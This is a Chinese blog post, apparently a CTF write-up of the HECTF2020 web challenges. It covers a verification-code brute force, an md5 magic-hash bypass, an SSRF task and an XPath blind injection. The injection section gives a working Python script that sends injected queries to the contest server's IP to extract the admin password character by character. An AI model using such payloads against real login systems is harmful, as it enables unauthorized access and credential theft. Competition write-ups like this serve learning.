---
title: HECTF2020-Web
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-11-23 21:31:22
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png
---
HECTF比较简单，和隔壁NCTF简直天差地别。。。不过人家这是新生赛。
先说下成绩，最高18名，还有半天的时间，继续c的话肯定能进线下，前十都有可能。
但是想了想，进线下第一没时间第二没钱第三学校不认证书第四觉得自己硬实力不够。
然后就放了没打，最后也是二十多名，前三十要交的wp也懒得交了，我就在这写一写Web的吧。

一、签到

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123213809.png)

hint.php提示爆破，但显然，直接爆破密码是没脑子的行为。
爆破点在忘记密码里面的验证码，爆出来是0233
改密码登录即可。

二、ezphp

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123213954.png)

阿这，这md5我都懒得写了。。。
脚本跑个md5值是0e开头但后面包含c的数字就行。

三、ssrfme

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123214143.png)

第九届极客大挑战原题

四、injection
XPATH盲注，啥都没过滤，也是右手就行
脚本：

    import requests

    url = "http://114.55.165.246:8082?username='or substring((//user[position()=1]/                   password[position()=1]),28,1)='{}'  or ''='&password=10&submit=%E7%99%BB%E5%BD%95"
    for i in range(30,128):
        url1=url.format(chr(i))
        a = requests.get(url=url1)
        print(a.text)
        if "登录成功you login as admin but username not admin"  in a.text:
            print(i)
            print(url1)
            break

下面还有个时间盲注永奇学长做出来了，我当时已经放了就没看，总之题比较简单，也没有很想c的欲望。